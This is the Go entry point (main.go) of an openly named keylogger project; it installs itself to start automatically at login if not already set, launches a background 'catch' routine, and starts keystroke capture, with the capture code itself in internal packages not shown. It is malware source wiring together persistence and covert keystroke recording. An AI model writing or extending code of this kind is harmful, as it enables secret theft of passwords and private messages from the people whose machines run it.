package main

import (
	"github.com/Tom5521/keylogger/internal/autostart"
	"github.com/Tom5521/keylogger/internal/catch"
	"github.com/Tom5521/keylogger/internal/keylogger"
)

func main() {
	app := autostart.Make()
	if !autostart.Check(app) {
		autostart.Set(app)
	}
	go catch.Init()
	keylogger.Init()
}
